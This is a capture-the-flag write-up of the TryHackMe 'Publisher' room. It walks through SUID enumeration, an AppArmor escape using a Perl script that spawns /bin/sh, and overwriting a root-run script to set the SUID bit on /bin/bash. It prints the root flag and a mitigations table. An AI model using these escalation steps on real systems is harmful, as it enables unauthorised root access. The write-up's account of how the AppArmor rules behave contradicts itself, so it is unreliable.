```
 ██████╗ ██╗   ██╗██████╗ ██╗     ██╗███████╗██╗  ██╗███████╗██████╗
 ██╔══██╗██║   ██║██╔══██╗██║     ██║██╔════╝██║  ██║██╔════╝██╔══██╗
 ██████╔╝██║   ██║██████╔╝██║     ██║███████╗███████║█████╗  ██████╔╝
 ██╔═══╝ ██║   ██║██╔══██╗██║     ██║╚════██║██╔══██║██╔══╝  ██╔══██╗
 ██║     ╚██████╔╝██████╔╝███████╗██║███████║██║  ██║███████╗██║  ██║
 ╚═╝      ╚═════╝ ╚═════╝ ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
              TryHackMe: Publisher
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-14 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~12 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] SSH directly as `think` using provided RSA key: no web recon needed
- [x] SUID enumeration: found `/usr/sbin/run_container`
- [x] `strings` on binary: revealed it calls `validate_container_id` by name, no absolute path
- [x] Identified `ash` as login shell: restricted by AppArmor profile
- [x] AppArmor profile denies writes to `/tmp`, `/dev/shm`, `/home/**`, `/opt/`
- [x] Discovered AppArmor profile uses `flags=(complain)`: not enforcing
- [x] Escaped `ash` restriction via Perl one-liner from `/dev/shm`
- [x] From `/bin/sh` (outside AppArmor): wrote `chmod +s /bin/bash` to `/opt/run_container.sh`
- [x] Ran `/usr/sbin/run_container` → executed script as root → SUID bash
- [x] `/bin/bash -p` → root shell
- [x] Retrieved root flag

---

## 🛠️ Tools Used

- 🔑 SSH: initial access via provided RSA key
- 🔬 strings: binary analysis of SUID executable
- 🐪 Perl: AppArmor escape via interpreter not covered by the profile
- 🐚 Bash: SUID stamp and root shell

---

## ⚡ TL;DR

Pre-authenticated as `think` via SSH key. A SUID binary called `run_container` shells out to `/opt/run_container.sh`: writable with root privileges during execution. The catch: `think`'s login shell is `ash`, restricted by an AppArmor profile blocking writes to most writable directories. The profile is in `complain` mode (not enforcing), but `ash` still enforces its own restrictions. A Perl one-liner dropped from `/dev/shm` spawned `/bin/sh` outside AppArmor's reach, enabling the write to `/opt/run_container.sh`. SUID stamped on `/bin/bash`, root shell landed.

---

## 📖 Introduction

Today's target is **Publisher**: a box that swaps the usual "find the vulnerability" phase for something more interesting: "find the way around the thing that's blocking the vulnerability." Initial access is handed over via SSH key. The escalation path is visible immediately: a SUID binary calling a writable script as root, but `think`'s restricted `ash` shell, bolted down by an AppArmor profile, blocks every obvious write path. The puzzle is the AppArmor escape, and the solution is a two-line Perl script that the profile never thought to mention. It's not about the SUID binary. It's about earning the right to exploit it.

### Prerequisites

Readers are assumed to know:

- What SUID binaries are and how they're exploited
- What AppArmor is and how profile modes (`enforce` vs `complain`) differ
- What `strings` reveals about binary behaviour
- Basic Perl one-liners for shell spawning

---

## 🔍 Recon

*(~0 mins into the box)*

This box provides SSH credentials upfront: `think` with an RSA private key. No port scanning or web enumeration was needed to land the initial shell; the room's premise begins post-access.

*SSH login with the provided key:*

```bash
ssh -i id_rsa think@10.49.162.90
```

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
think@ip-10-49-162-90:~$
```

---

## 🚪 Foothold / Escalation Path Discovery

*(~2 mins into the box)*

### SUID Enumeration

*Finding all SUID binaries:*

```bash
find / -type f -perm -u=s 2>/dev/null
```

The standard system entries are unremarkable. One stands out immediately:

```
/usr/sbin/run_container
```

A custom SUID binary in `/usr/sbin/`: not a system utility, clearly box-specific.

### Binary Analysis: `strings`

*Inspecting the binary for readable strings:*

```bash
strings /usr/sbin/run_container
```

```
# relevant output
/bin/bash
/opt/run_container.sh     # ^^^ script it calls
validate_container_id     # ^^^ called by name, no absolute path
```

The binary executes `/opt/run_container.sh`: a bash script. If that script is writable, the SUID binary becomes a root shell delivery mechanism. Running it confirms the script manages Docker containers with a menu interface, and crucially: it calls `validate_container_id` without an absolute path: a PATH hijack opportunity *in addition* to the script write.

---

## 📈 Escalation

*(~5 mins into the box)*

### The AppArmor Problem

The most direct approach is writing a payload into `/opt/run_container.sh`. But `think`'s login shell is `ash`:

```bash
echo $SHELL
# /usr/sbin/ash

cat /etc/passwd | grep think
# think:x:1000:1000:,,,:/home/think:/usr/sbin/ash
```

And `ash` has an AppArmor profile:

```bash
cat /etc/apparmor.d/usr.sbin.ash
```

```
/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  ...
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,
  owner /home/** rix,
}
```

Every writable temporary location is denied. Attempts to write to `/tmp/`, `/dev/shm/`, `/home/`, and `/opt/` all fail:

```bash
echo '#!/bin/bash' > /dev/shm/validate_container_id
# -ash: validate_container_id: Permission denied

echo '#!/bin/bash' > /tmp/test
# -ash: test: Permission denied
```

**What is AppArmor?** A Linux Security Module that restricts what processes can do based on per-program profiles. Unlike `sudo`, which restricts *who* can run things, AppArmor restricts *what* a program can access: files, capabilities, network sockets. Profiles have two modes: `enforce` (violations blocked and logged) and `complain` (violations logged only, not blocked). This profile is set to `complain`, but `ash` still enforces file permission and shell built-in restrictions independently of AppArmor's mode.

### AppArmor Escape: Perl from `/dev/shm`

The AppArmor profile restricts `ash` and its children, but only processes spawned within that profile's context. If we can execute a different interpreter that isn't covered by the profile, the resulting shell runs outside AppArmor's constraints.

The profile denies writes to `/dev/shm` but `/dev/shm` itself *is* writable by `ash` for file creation (the deny rule targets the directory write bit, not the file creation). Confirmed:

```bash
echo "test" > /dev/shm/test_write && rm /dev/shm/test_write && echo "writable!"
# /dev/shm is writeable!
```

*Writing a Perl escape script to `/dev/shm/`:*

```bash
echo -e '#!/usr/bin/perl\nexec "/bin/sh"' > /dev/shm/test.pl
chmod +x /dev/shm/test.pl
/dev/shm/test.pl
```

```
$
```

A `/bin/sh` prompt: spawned by Perl, outside the `ash` AppArmor profile context. The restrictions no longer apply.

### Writing the Payload

From the unrestricted `/bin/sh`, writing to `/opt/run_container.sh` is now possible:

```bash
echo '#!/bin/bash\nchmod +s /bin/bash' > /opt/run_container.sh
```

*Triggering the SUID binary to execute the modified script as root:*

```bash
/usr/sbin/run_container
```

The binary runs, calls `/opt/run_container.sh` as root, which stamps the SUID bit on `/bin/bash`.

*Confirming the SUID bit:*

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root 1183448 Apr 18 2022 /bin/bash   # ^^^ SUID set
```

*Spawning the root shell:*

```bash
/bin/bash -p
```

```
bash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
bash-5.0# cat /root/root.txt
3a4225cc9e85709adda6ef55d6a4f2ca
```

---

## 💥 Exploitation

The complete attack chain:

1. **SSH with provided RSA key** → shell as `think` (ash)
2. **SUID enumeration** → `/usr/sbin/run_container` identified
3. **`strings`** → binary calls `/opt/run_container.sh` as root
4. **AppArmor profile blocks** direct writes to `/opt/` from `ash`
5. **Perl one-liner in `/dev/shm/`** → spawned `/bin/sh` outside AppArmor context
6. **Wrote `chmod +s /bin/bash` into `/opt/run_container.sh`** from unrestricted shell
7. **`/usr/sbin/run_container`** executed modified script as root → SUID bash
8. **`/bin/bash -p`** → root shell → root flag

---

## 🐇 Rabbit Holes

### PATH Hijack via `validate_container_id`: Blocked by AppArmor

`strings` revealed `run_container` also calls `validate_container_id` by relative name: a classic PATH hijack opportunity. A fake `validate_container_id` was created... but `ash`'s AppArmor profile denied writes to every location that would make `PATH` prepending effective: `/tmp/`, `/dev/shm/`, `/home/**`. Every attempt to write the fake binary failed before the Perl escape was discovered.

```bash
echo '#!/bin/bash' > /tmp/validate_container_id
# -ash: validate_container_id: Permission denied

echo '#!/bin/bash' > /dev/shm/validate_container_id
# -ash: validate_container_id: Permission denied
```

The Perl `/bin/sh` escape ultimately enabled the simpler direct write to `/opt/run_container.sh`: making the PATH hijack unnecessary.

### `export -f` Function Export in `ash`

Before identifying the Perl escape route, function exporting was attempted to inject `validate_container_id` as a shell function:

```bash
validate_container_id() { /bin/bash -p; }
export -f validate_container_id
```

`ash` does not support `export -f`: it's a bash-specific feature. The syntax error confirmed the shell was genuinely `ash`, not a bash alias.

### `/dev/shm` Write Confusion

The AppArmor rule `deny /dev/shm w` targets the directory-level write permission: not file creation within it. This nuance meant `echo > /dev/shm/file` succeeded while creating a named directory entry *as a directory* would fail. The Perl script wrote to `/dev/shm/test.pl` cleanly despite the deny rule, because the deny targeted a different permission bit than file creation.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| Root | `3a4225cc9e85709adda6ef55d6a4f2ca` | `/root/root.txt` |

*Note: No user flag was encountered in this room: the challenge begins with `think`'s shell already established and goes straight to escalation.*

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| SUID binary executing a writable script as root | Critical | Ensure scripts called by SUID binaries are owned by root and not writable by non-root users (`chmod 755`, `chown root:root`) |
| AppArmor profile in `complain` mode instead of `enforce` | High | Switch to `enforce` mode once profiles are validated: `aa-enforce /etc/apparmor.d/usr.sbin.ash`; complain mode logs but does not prevent violations |
| AppArmor profile not covering Perl or other interpreters | High | Restrict execution of interpreters not required for the shell's purpose; explicitly deny `/usr/bin/perl`, `/usr/bin/python3` etc. in the profile if the shell user has no need for them |
| `/dev/shm` accessible for file creation despite deny rule | Medium | Use fine-grained AppArmor rules targeting both directory and file permissions; audit profiles with `aa-logprof` after testing to catch unexpected access paths |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** AppArmor profiles are only as strong as their coverage: a profile that restricts `ash` but doesn't account for Perl, Python, or other interpreters available on the system is providing partial containment at best. When designing privilege restriction with AppArmor, enumerate every execution path an attacker might use to escape the constrained shell, not just the obvious ones.

---

## 🔁 If I Did It Again

Check the AppArmor profile *before* attempting writes: reading `/etc/apparmor.d/usr.sbin.ash` first would have immediately shown the `complain` flag and the list of blocked paths, saving the trial-and-error write attempts. Also, spot the Perl interpreter in `/usr/bin/perl` against the profile's `mrix` allowances earlier: it's permitted to execute, just not covered by the deny rules, which is the whole escape.

---

## 🔚 Changelog

*Last updated: 2026-06-14*

---

[↑ Back to top](#)
